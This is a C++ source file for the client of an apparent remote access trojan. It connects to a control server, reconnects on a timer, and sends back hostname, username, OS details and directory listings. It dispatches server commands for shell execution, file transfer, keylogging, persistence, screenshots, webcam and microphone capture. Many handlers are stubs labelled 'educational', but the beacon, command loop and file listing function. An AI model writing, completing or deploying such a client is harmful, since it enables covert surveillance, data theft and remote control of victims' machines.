#include "client.h"
#include <iostream>
#include <sstream>
#include <fstream>
#include <cstdlib>
#include <unistd.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <chrono>
#include <thread>

Client::Client(const std::string &server_addr, uint16_t port)
    : server_address(server_addr), server_port(port),
      is_running(false), auto_reconnect(true), reconnect_interval(60)
{

    setupCommandHandlers();
}

Client::~Client()
{
    stop();
}

void Client::setupCommandHandlers()
{
    command_handlers[CMD_PING] = std::bind(&Client::handlePing, this,
                                           std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_SHELL_EXEC] = std::bind(&Client::handleShellExec, this,
                                                 std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_FILE_LIST] = std::bind(&Client::handleFileList, this,
                                                std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_FILE_UPLOAD] = std::bind(&Client::handleFileUpload, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_FILE_DOWNLOAD] = std::bind(&Client::handleFileDownload, this,
                                                    std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_SCREENSHOT] = std::bind(&Client::handleScreenshot, this,
                                                 std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_KEYLOG_START] = std::bind(&Client::handleKeylogger, this,
                                                   std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_KEYLOG_STOP] = std::bind(&Client::handleKeylogger, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_KEYLOG_DUMP] = std::bind(&Client::handleKeylogger, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_PERSISTENCE] = std::bind(&Client::handlePersistence, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_REMOVE_PERSISTENCE] = std::bind(&Client::handlePersistence, this,
                                                         std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_SYSTEM_INFO] = std::bind(&Client::handlePing, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_PROCESS_LIST] = std::bind(&Client::handleProcessList, this,
                                                   std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_PROCESS_KILL] = std::bind(&Client::handleProcessKill, this,
                                                   std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_WEBCAM_CAPTURE] = std::bind(&Client::handleWebcam, this,
                                                     std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_MIC_RECORD] = std::bind(&Client::handleMicrophone, this,
                                                 std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_EXIT] = std::bind(&Client::handleExit, this,
                                           std::placeholders::_1, std::placeholders::_2);
}

bool Client::connect()
{
    if (isConnected())
        return true;

    try
    {
        // Create socket
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
        {
            std::cerr << "Failed to create socket" << std::endl;
            return false;
        }

        // Connect to server
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);

        if (inet_pton(AF_INET, server_address.c_str(), &server_addr.sin_addr) <= 0)
        {
            std::cerr << "Invalid address: " << server_address << std::endl;
            close(sock);
            return false;
        }

        if (::connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
        {
            std::cerr << "Connection failed: " << strerror(errno) << std::endl;
            close(sock);
            return false;
        }

        // Create connection object
        connection = std::make_shared<Connection>(sock, server_address, server_port, true);

        return true;
    }
    catch (const std::exception &e)
    {
        std::cerr << "Error connecting to server: " << e.what() << std::endl;
        return false;
    }
}

void Client::disconnect()
{
    if (connection)
    {
        connection->disconnect();
        connection.reset();
    }
}

bool Client::isConnected() const
{
    return connection && connection->isConnected();
}

void Client::setAutoReconnect(bool enable, int interval_seconds)
{
    auto_reconnect = enable;
    reconnect_interval = interval_seconds;
}

bool Client::sendSystemInfo()
{
    if (!isConnected())
        return false;

    std::string info = getSystemInfo();
    std::vector<uint8_t> payload(info.begin(), info.end());

    return executeCommand(CMD_SYSTEM_INFO, payload);
}

bool Client::executeCommand(uint16_t command, const std::vector<uint8_t> &payload)
{
    if (!isConnected())
        return false;

    try
    {
        return connection->sendPacket(command, payload);
    }
    catch (const std::exception &e)
    {
        std::cerr << "Error executing command: " << e.what() << std::endl;
        return false;
    }
}

void Client::start()
{
    if (is_running)
        return;

    is_running = true;
    command_thread = std::thread(&Client::commandLoop, this);
}

void Client::stop()
{
    if (!is_running)
        return;

    is_running = false;
    disconnect();

    if (command_thread.joinable())
    {
        command_thread.join();
    }
}

void Client::commandLoop()
{
    while (is_running)
    {
        if (!isConnected())
        {
            if (auto_reconnect)
            {
                attemptReconnect();
            }
            else
            {
                // Exit if not connected and auto-reconnect is disabled
                break;
            }
            continue;
        }

        try
        {
            // Wait for command from server
            auto [command, payload] = connection->recvPacket();

            // Extract sequence number from header
            PacketHeader header;
            std::memcpy(&header, payload.data(), sizeof(header));
            uint32_t sequence = header.sequence;

            // Handle command
            auto it = command_handlers.find(command);
            if (it != command_handlers.end())
            {
                try
                {
                    it->second(payload, sequence);
                }
                catch (const std::exception &e)
                {
                    std::cerr << "Error handling command " << command
                              << ": " << e.what() << std::endl;
                    connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
                }
            }
            else
            {
                connection->sendResponse(STATUS_ERROR_NOT_IMPLEMENTED, sequence, {});
            }
        }
        catch (const std::exception &e)
        {
            if (is_running)
            {
                std::cerr << "Error in command loop: " << e.what() << std::endl;
                disconnect();
            }
        }
    }
}

void Client::attemptReconnect()
{
    if (isConnected())
        return;

    std::cerr << "Attempting to reconnect to " << server_address << ":" << server_port << std::endl;

    // Try to connect
    if (connect())
    {
        std::cerr << "Reconnected to server" << std::endl;

        // Send system info
        sendSystemInfo();
    }
    else
    {
        // Wait before retrying
        std::cerr << "Reconnection failed, retrying in " << reconnect_interval << " seconds" << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(reconnect_interval));
    }
}

bool Client::handlePing(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // For ping, we just echo back the payload
    connection->sendResponse(STATUS_SUCCESS, sequence, payload);
    return true;
}

bool Client::handleShellExec(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    if (payload.size() <= sizeof(PacketHeader))
    {
        connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
        return false;
    }

    // Extract command from payload
    std::string command(reinterpret_cast<const char *>(payload.data() + sizeof(PacketHeader)),
                        payload.size() - sizeof(PacketHeader));

    // For educational purposes only, in a real implementation we would execute the command
    // using popen() or system() and capture the output
    std::string output = "Command executed: " + command;

    // Send response with output
    std::vector<uint8_t> response_payload(output.begin(), output.end());
    connection->sendResponse(STATUS_SUCCESS, sequence, response_payload);

    return true;
}

bool Client::handleFileList(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    if (payload.size() <= sizeof(PacketHeader))
    {
        connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
        return false;
    }

    // Extract path from payload
    std::string path(reinterpret_cast<const char *>(payload.data() + sizeof(PacketHeader)),
                     payload.size() - sizeof(PacketHeader));

    std::stringstream ss;

    // For educational purposes only, this is a simplified implementation
    DIR *dir = opendir(path.c_str());
    if (dir)
    {
        struct dirent *entry;
        while ((entry = readdir(dir)) != nullptr)
        {
            std::string filename = entry->d_name;

            // Skip . and ..
            if (filename == "." || filename == "..")
                continue;

            // Get file info
            struct stat file_stat;
            std::string full_path = path + "/" + filename;
            if (stat(full_path.c_str(), &file_stat) == 0)
            {
                bool is_dir = S_ISDIR(file_stat.st_mode);
                ss << (is_dir ? "D" : "F") << " " << filename << " " << file_stat.st_size << std::endl;
            }
        }
        closedir(dir);

        std::string file_list = ss.str();
        std::vector<uint8_t> response_payload(file_list.begin(), file_list.end());
        connection->sendResponse(STATUS_SUCCESS, sequence, response_payload);
        return true;
    }
    else
    {
        connection->sendResponse(STATUS_ERROR_NOT_FOUND, sequence, {});
        return false;
    }
}

bool Client::handleFileUpload(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Educational implementation - in a real scenario this would save the file to disk
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    return true;
}

bool Client::handleFileDownload(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Educational implementation - in a real scenario this would read the file and send it
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    return true;
}

bool Client::handleScreenshot(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Educational implementation - in a real scenario this would capture a screenshot
    // using libraries like X11 or XCB
    std::vector<uint8_t> screenshot = captureScreenshot();
    connection->sendResponse(STATUS_SUCCESS, sequence, screenshot);
    return true;
}

bool Client::handleKeylogger(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Educational implementation
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    return true;
}

bool Client::handlePersistence(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Educational implementation
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    return true;
}

bool Client::handleProcessList(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Educational implementation
    std::vector<uint8_t> process_list = getProcessList();
    connection->sendResponse(STATUS_SUCCESS, sequence, process_list);
    return true;
}

bool Client::handleProcessKill(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Educational implementation
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    return true;
}

bool Client::handleWebcam(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Educational implementation
    std::vector<uint8_t> webcam_image = captureWebcam();
    connection->sendResponse(STATUS_SUCCESS, sequence, webcam_image);
    return true;
}

bool Client::handleMicrophone(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Educational implementation
    std::vector<uint8_t> audio = recordMicrophone(5); // 5 seconds
    connection->sendResponse(STATUS_SUCCESS, sequence, audio);
    return true;
}

bool Client::handleExit(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Acknowledge command
    connection->sendResponse(STATUS_SUCCESS, sequence, {});

    // Disconnect and stop client
    stop();
    return true;
}

std::string Client::getSystemInfo()
{
    std::stringstream ss;

    // Get hostname
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0)
    {
        ss << "Hostname: " << hostname << std::endl;
    }
    else
    {
        ss << "Hostname: Unknown" << std::endl;
    }

    // Get username
    struct passwd *pw = getpwuid(getuid());
    if (pw)
    {
        ss << "Username: " << pw->pw_name << std::endl;
    }
    else
    {
        ss << "Username: Unknown" << std::endl;
    }

    // Get OS info
    struct utsname uts_info;
    if (uname(&uts_info) == 0)
    {
        ss << "OS: " << uts_info.sysname << " " << uts_info.release << " " << uts_info.version << std::endl;
        ss << "Architecture: " << uts_info.machine << std::endl;
    }
    else
    {
        ss << "OS: Unknown" << std::endl;
    }

    // Get current working directory
    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd)) != nullptr)
    {
        ss << "Working Directory: " << cwd << std::endl;
    }

    return ss.str();
}

std::vector<uint8_t> Client::captureScreenshot()
{
    // For educational purposes only
    // This would normally use X11, Wayland, or platform-specific APIs

    // Generate a dummy image for demonstration
    std::string dummy_image = "This is a placeholder for screenshot data";
    return std::vector<uint8_t>(dummy_image.begin(), dummy_image.end());
}

std::vector<uint8_t> Client::captureWebcam()
{
    // For educational purposes only
    // This would normally use V4L2, OpenCV, or platform-specific APIs

    // Generate a dummy image for demonstration
    std::string dummy_image = "This is a placeholder for webcam image data";
    return std::vector<uint8_t>(dummy_image.begin(), dummy_image.end());
}

std::vector<uint8_t> Client::recordMicrophone(int seconds)
{
    // For educational purposes only
    // This would normally use ALSA, PulseAudio, or platform-specific APIs

    // Generate dummy audio data for demonstration
    std::string dummy_audio = "This is a placeholder for audio data";
    return std::vector<uint8_t>(dummy_audio.begin(), dummy_audio.end());
}

bool Client::installPersistence()
{
    // For educational purposes only
    return true;
}

bool Client::removePersistence()
{
    // For educational purposes only
    return true;
}

std::vector<uint8_t> Client::getProcessList()
{
    // For educational purposes - in a real implementation,
    // this would read from /proc and parse process information

    std::string dummy_list = "PID\tName\tUser\n";
    dummy_list += "1\tsystemd\troot\n";
    dummy_list += "2\tkthreadd\troot\n";

    return std::vector<uint8_t>(dummy_list.begin(), dummy_list.end());
}

bool Client::killProcess(int pid)
{
    // For educational purposes only
    return true;
}